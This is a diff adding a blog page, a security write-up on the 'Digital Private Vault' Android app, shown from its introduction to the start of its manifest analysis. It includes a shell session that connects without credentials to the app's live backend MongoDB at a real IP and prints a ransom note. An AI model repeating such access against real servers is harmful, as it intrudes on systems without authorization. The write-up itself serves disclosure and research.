@@ -1,0 +1,4967 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" >
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Digital Private Vault (APK) - Subverting an (in)secure Android vault" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="This article presents the analysis of Digital Private Vault Android application, highlighting some bad practices and vulnerabilities in the product that can be exploited to completely subvert the purpose of the vault, finally exposing the secrets stored inside it." />
+<meta property="og:description" content="This article presents the analysis of Digital Private Vault Android application, highlighting some bad practices and vulnerabilities in the product that can be exploited to completely subvert the purpose of the vault, finally exposing the secrets stored inside it." />
+<link rel="canonical" href="http://localhost:4000/posts/digital-private-vault/" />
+<meta property="og:url" content="http://localhost:4000/posts/digital-private-vault/" />
+<meta property="og:site_name" content="0xbro" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-29T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Digital Private Vault (APK) - Subverting an (in)secure Android vault" />
+<meta name="twitter:site" content="@sec_0xbro" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-06-29T00:00:00+02:00","datePublished":"2023-06-29T00:00:00+02:00","description":"This article presents the analysis of Digital Private Vault Android application, highlighting some bad practices and vulnerabilities in the product that can be exploited to completely subvert the purpose of the vault, finally exposing the secrets stored inside it.","headline":"Digital Private Vault (APK) - Subverting an (in)secure Android vault","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/digital-private-vault/"},"url":"http://localhost:4000/posts/digital-private-vault/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>Digital Private Vault (APK) - Subverting an (in)secure Android vault | 0xbro
+  </title>
+
+  <!--
+  Custom Favicons - using favicon.ico only
+-->
+
+<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">
+
+  <!-- Resource Hints -->
+  
+    
+      
+        <link rel="preconnect" href="https://fonts.googleapis.com" >
+      
+        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      
+        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      
+        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+      
+    
+  
+
+  <!-- Bootstrap -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
+  
+
+  <!-- Theme style -->
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  <!-- Web Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">
+
+  <!-- 3rd-party Dependencies -->
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
+  
+
+  <!-- Scripts -->
+
+  <script src="/assets/js/dist/theme.min.js"></script>
+
+  <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>
+
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
+
+
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <a class="site-title d-block" href="/">0xbro</a>
+    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+
+      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
+      
+        
+          <li class="nav-item">
+            <a href="/about/" class="nav-link">
+              <i class="fa-fw fas fa-info-circle"></i>
+              <span>ABOUT</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/timeline/" class="nav-link">
+              <i class="fa-fw fas fa-timeline"></i>
+              <span>TIMELINE</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/disclosure/" class="nav-link">
+              <i class="fa-fw fas fa-handshake"></i>
+              <span>DISCLOSURE</span>
+            </a>
+          </li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+
+      <!-- Separator -->
+      <li class="nav-item nav-separator">
+        <hr class="sidebar-divider">
+      </li>
+
+      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
+      
+        
+      
+        
+      
+        
+      
+        
+          <li class="nav-item">
+            <a href="/categories/" class="nav-link">
+              <i class="fa-fw fas fa-stream"></i>
+              <span>CATEGORIES</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/projects/" class="nav-link">
+              <i class="fa-fw fas fa-code"></i>
+              <span>PROJECTS</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/tags/" class="nav-link">
+              <i class="fa-fw fas fa-tags"></i>
+              <span>TAGS</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/archives/" class="nav-link">
+              <i class="fa-fw fas fa-archive"></i>
+              <span>ARCHIVES</span>
+            </a>
+          </li>
+        
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
+    
+      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+
+      
+        <a
+          href="https://github.com/0xb120"
+          aria-label="github"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+
+      
+        <a
+          href="https://twitter.com/sec_0xbro"
+          aria-label="twitter"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fa-brands fa-x-twitter"></i>
+        </a>
+      
+    
+          
+      
+
+      
+        <a
+          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
+          aria-label="linkedin"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-linkedin"></i>
+        </a>
+      
+    
+          
+        
+
+      
+        <a
+          href="/feed.xml"
+          aria-label="rss"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-rss"></i>
+        </a>
+      
+    
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+            
+              <span>Digital Private Vault (APK) - Subverting an (in)secure Android vault</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search id="search" class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+
+
+
+
+
+
+<article class="px-1" data-toc="true">
+  <header>
+    <h1 data-toc-skip>Digital Private Vault (APK) - Subverting an (in)secure Android vault</h1>
+    
+      <p class="post-desc fw-light mb-4">This article presents the analysis of Digital Private Vault Android application, highlighting some bad practices and vulnerabilities in the product that can be exploited to completely subvert the purpose of the vault, finally exposing the secrets stored inside it.</p>
+    
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1687989600"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Jun 29, 2023
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://twitter.com/sec_0xbro">0xbro</a>
+            
+          </em>
+        </span>
+
+        <div>
+          <!-- pageviews -->
+          
+
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="3304 words"
+>
+  <em>18 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  
+    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
+      <span class="label text-truncate">Digital Private Vault (APK) - Subverting an (in)secure Android vault</span>
+      <button type="button" class="toc-trigger btn me-1">
+        <i class="fa-solid fa-list-ul fa-fw"></i>
+      </button>
+    </div>
+
+    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
+      <span class="label ps-2 pe-1">Contents</span>
+      <i class="fa-solid fa-angle-right fa-fw"></i>
+    </button>
+
+    <dialog id="toc-popup" class="p-0">
+      <div class="header d-flex flex-row align-items-center justify-content-between">
+        <div class="label text-truncate py-2 ms-4">Digital Private Vault (APK) - Subverting an (in)secure Android vault</div>
+        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
+          <i class="fas fa-close"></i>
+        </button>
+      </div>
+      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
+    </dialog>
+  
+
+  <div class="content">
+    <h3 class="no_toc" id="product-details">Product details</h3>
+
+<dl>
+  <dt>Application</dt>
+  <dd><a href="https://play.google.com/store/apps/details?id=com.techuz.privatevault">Digital Private Vault</a></dd>
+  <dt>Official website</dt>
+  <dd><a href="https://www.digitalprivatevault.com/">www.digitalprivatevault.com</a></dd>
+  <dt>Company</dt>
+  <dd><a href="https://www.techuz.com/">Techuz</a></dd>
+  <dt>Version</dt>
+  <dd>1.6</dd>
+  <dt>Downloads</dt>
+  <dd>10K+</dd>
+  <dt>Package</dt>
+  <dd>com.techuz.privatevault</dd>
+  <dt>Min. Android version</dt>
+  <dd>5.0 (API level 21)</dd>
+</dl>
+
+<hr />
+
+<h2 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>It is well known that Google Play does not verify applications uploaded to the store, making it quite common to run into apps that are supposed to ensure user security and privacy, but actually do anything but that. Some of these applications even have to be purchased or require the user to pay for the full version.</p>
+
+<p>While I was looking for some of these applications, I came across Digital Private Vault.</p>
+
+<p>Quoting the official description of the application:</p>
+<blockquote>
+  <p>Digital Private Vault is a simple yet smart private photo vault app that allows you to hide all your personal data in one place. […] Digital Private Vault will work as your vault app for your Android phone and tablet that safeguards your personal data.</p>
+</blockquote>
+
+<p>Among the most important features, Digital Private Vault allows its users to store their images, videos, and notes inside multiple private areas, each one protected with a common 4-digit PIN (mmmmh…) and a folder-specific password.</p>
+
+<p><a href="/assets/img/digital-private-vault/sc1.png" class="popup img-link left shimmer"><img src="/assets/img/digital-private-vault/sc1.png" alt="pin" width="220"  loading="lazy"></a>
+<a href="/assets/img/digital-private-vault/sc2.png" class="popup img-link left shimmer"><img src="/assets/img/digital-private-vault/sc2.png" alt="dashboard" width="220"  loading="lazy"></a>
+<a href="/assets/img/digital-private-vault/sc3.png" class="popup img-link normal shimmer"><img src="/assets/img/digital-private-vault/sc3.png" alt="albums" width="220"  loading="lazy"></a></p>
+
+<p>It is also important to notice that some features are currently broken because the back-end server (52.15.243.62) has been compromised at some point in the past <sup id="fnref:shodan"><a href="#fn:shodan" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> but never repaired:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>mongo 52.15.243.62      
+MongoDB shell version v6.0.1
+connecting to: mongodb://52.15.243.62:27017/test?compressors<span class="o">=</span>disabled&amp;gssapiServiceName<span class="o">=</span>mongodb
+Implicit session: session <span class="o">{</span> <span class="s2">"id"</span> : UUID<span class="o">(</span><span class="s2">"0b3b883d-448b-4246-bd95-6b4b060a4c16"</span><span class="o">)</span> <span class="o">}</span>
+MongoDB server version: 4.0.12
+...
+<span class="o">&gt;</span> show dbs<span class="p">;</span>
+READ__ME_TO_RECOVER_YOUR_DATA  0.000GB
+admin                          0.000GB
+angularfullstack               0.000GB
+config                         0.000GB
+<span class="o">&gt;</span> use READ__ME_TO_RECOVER_YOUR_DATA
+switched to db READ__ME_TO_RECOVER_YOUR_DATA
+<span class="o">&gt;</span> show collections<span class="p">;</span>
+README
+<span class="o">&gt;</span> db.README.find<span class="o">()</span>
+<span class="o">{</span> <span class="s2">"_id"</span> : ObjectId<span class="o">(</span><span class="s2">"6488e1bdcfa44d6e4a22abf2"</span><span class="o">)</span>, 
+<span class="s2">"content"</span> : <span class="s2">"All your data was backed up. You need to email us at rambler+1rhcl@onionmail.org to recover your data. 
+(more information: go to https://cutt.ly/recdb1) ALLWAYS CHECK YOUR SPAM FOLDER! OR YOU MAY MISS OUR MAILS
+If you dont answer we will leak and expose all your data and in 48hs delete it forever from our server."</span> 
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="information-gathering"><span class="me-2">Information gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>The application has been tested using a rooted Android 10 emulator (read <em>How to set up an Android Penetration Testing Lab from scratch</em> <sup id="fnref:setup"><a href="#fn:setup" class="footnote" rel="footnote" role="doc-noteref">2</a></sup> for more details about the configuration).</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>.<span class="se">\s</span>dkmanager.bat <span class="nt">--install</span> <span class="s2">"system-images;android-29;google_apis;x86"</span>
+.<span class="se">\a</span>vdmanager.bat <span class="nt">--verbose</span> create avd <span class="nt">--force</span> <span class="nt">--name</span> <span class="s2">"generic_api29_google_apis_emulator"</span> <span class="nt">--package</span> <span class="s2">"system-images;android-29;google_apis;x86"</span> <span class="nt">--tag</span> <span class="s2">"google_apis"</span> <span class="nt">--abi</span> <span class="s2">"x86"</span>
+.<span class="se">\e</span>mulator.exe <span class="nt">-avd</span> generic_28
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>To get a quick overview of the application, we scanned the APK with MobSF <sup id="fnref:mobsf"><a href="#fn:mobsf" class="footnote" rel="footnote" role="doc-noteref">3</a></sup>, which reported the following high-level summary with lots of other details:</p>
+
+<p><a href="/assets/img/digital-private-vault/mobsf1.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/mobsf1.png" alt="mobsf" loading="lazy"></a></p>
+
+<p>By decompiling the application with jadx-gui <sup id="fnref:jadx-gui"><a href="#fn:jadx-gui" class="footnote" rel="footnote" role="doc-noteref">4</a></sup> we noticed that the source code was not obfuscated at all, helping us a lot with the analysis.</p>
+
+<p><a href="/assets/img/digital-private-vault/code1.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/code1.png" alt="jadx-gui" loading="lazy"></a></p>
+
+<h3 id="androidmanifestxml"><span class="me-2">AndroidManifest.xml</span><a href="#androidmanifestxml" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>From the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> file we can extract some very interesting information (detected also with MobSF).</p>
+
+<ul>
+  <li>The application uses clear-text traffic:</li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;application</span> <span class="na">android:theme=</span><span class="s">"@style/AppTheme"</span> 
+<span class="err">...</span> <span class="na">android:name=</span><span class="s">"com.techuz.privatevault.PrivateVaultApp"</span> <span class="na">android:allowBackup=</span><span class="s">"false"</span> 
+<span class="err">...</span> <span class="na">android:usesCleartextTraffic=</span><span class="s">"true"</span> <span class="err">...</span> <span class="nt">&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/assets/img/digital-private-vault/clear-text1.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/clear-text1.png" alt="clear-text1" loading="lazy"></a>
+<em>MobSF finding</em></p>
+
+<ul>
+  <li>There are two components explicitly exported <sup id="fnref:android-exported"><a href="#fn:android-exported" class="footnote" rel="footnote" role="doc-noteref">5</a></sup>:</li>
+</ul>
+
